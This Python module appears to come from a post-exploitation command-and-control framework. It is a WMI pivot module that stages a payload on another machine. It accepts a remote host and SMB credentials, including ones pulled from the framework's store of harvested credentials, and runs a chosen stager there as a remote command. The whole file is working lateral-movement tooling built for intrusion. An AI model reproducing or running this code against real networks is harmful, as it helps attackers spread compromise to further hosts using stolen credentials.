import core.job
import core.implant

# todo: inherit the exec_wmi module's jobs and implant instead of copypasta

class SWbemServicesJob(core.job.Job):
    def done(self):
        self.results = "PID Start Code: %s" % self.data
        self.display()

    def display(self):
        self.shell.print_plain("PID Start Code: %s" % self.data)

class SWbemServicesImplant(core.implant.Implant):

    NAME = "WMI SWbemServices"
    DESCRIPTION = "Stages another system."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/pivot/stage_wmi"

    def load(self):
        self.options.register("CMD", "hostname", "Command to run.", hidden=True)
        self.options.register("RHOST", "", "Name/IP of the remote.")
        self.options.register("SMBUSER", "", "Username for login.")
        self.options.register("SMBPASS", "", "Password for login.")
        self.options.register("SMBDOMAIN", ".", "domain for login.")
        self.options.register("CREDID", "", "Cred ID from creds.")
        self.options.register("STAGER", "", "Stager to stage.")

    def job(self):
        return SWbemServicesJob

    def run(self):
        id = self.options.get("STAGER")
        payload = self.load_payload(id)

        if payload is None:
            self.shell.print_error("No such stager!")
            return

        self.options.set("CMD", payload)

        cred_id = self.options.get("CREDID")

        if cred_id:
            key = self.shell.creds_keys[int(cred_id)]
            smbuser = self.shell.creds[key]["Username"]
            smbpass = self.shell.creds[key]["Password"]
            smbdomain = self.shell.creds[key]["Domain"]
            self.options.set("SMBUSER", smbuser)
            if not smbuser:
                self.shell.print_warning("Cred has no Username!")
            self.options.set("SMBPASS", smbpass)
            if not smbpass:
                self.shell.print_warning("Cred has no Password!")
            self.options.set("SMBDOMAIN", smbdomain)
            if not smbdomain:
                self.shell.print_warning("Cred has no Domain!")

        payloads = {}
        payloads["js"] = "data/implant/pivot/exec_wmi.js"

        self.dispatch(payloads, self.job)
